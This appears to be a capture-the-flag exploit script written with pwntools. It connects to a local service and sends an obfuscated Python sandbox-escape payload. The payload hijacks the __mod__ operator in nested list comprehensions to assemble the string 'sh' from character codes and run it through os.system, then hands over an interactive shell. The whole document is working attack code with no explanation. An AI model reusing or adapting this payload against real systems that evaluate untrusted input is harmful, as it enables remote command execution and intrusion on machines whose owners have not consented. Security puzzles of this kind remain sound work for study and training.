from pwn import *

r = remote('localhost', 22223)
p = '[[A.attr%i for A.__mod__ in [os.system]] for i in [[A.attr%i for A.__mod__ in [str]] for i in [[A.attr%i for A.__mod__ in [bytearray]] for i in [[A.attr%i for A.__mod__ in [chr] for i in [115, 104]]]][0]][0]]'

r.sendline(p)
r.interactive()
